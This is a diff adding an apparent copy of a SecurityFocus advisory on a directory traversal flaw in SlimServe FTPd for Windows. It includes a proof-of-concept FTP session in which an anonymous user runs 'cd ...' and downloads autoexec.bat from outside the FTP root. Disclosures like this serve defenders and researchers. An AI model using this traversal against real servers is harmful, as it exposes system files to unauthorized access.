@@ -1,0 +1,22 @@
+source: http://www.securityfocus.com/bid/2452/info
+
+SlimServ FTPd is a free ftp server distributed and maintained by WhitSoft Development. SlimServe FTPd is designed to offer ftp services to the Microsoft Windows platform.
+
+A problem with the SlimSoft FTP daemon allows remote users to traverse directories outside of the ftp root. Due to the insufficient checking of input, it is possible for a user to escape the ftp root directory by using relative paths. By requesting a directory change of "..." (three dots), it is possible to gain access to the root directory of the partition the ftp server is running on, and potentially gain access to sensitive system files.
+
+Therefore, it is possible for a remote malicious user to gain access to sensitive system files, and potentially gain elevated privileges or privileged information.
+
+% ftp localhost
+Connected to xxxxxxxxxx.rh.rit.edu.
+220-SlimServe FTPd 1.0 :: www.whitsoftdev.com.
+220 127.0.0.1 connected to xxxxxxxxxx.rh.rit.edu.
+User (xxxxxxxxxx.rh.rit.edu:(none)): anonymous
+230 User anonymous logged in, proceed.
+ftp> cd ...
+250 CWD command successful.
+ftp> get autoexec.bat
+200 PORT command successful.
+150 Opening data connection for "/.../autoexec.bat".
+250 RETR command successful.
+ftp: 383 bytes received in 0.16Seconds 2.39Kbytes/sec.
+ftp> 
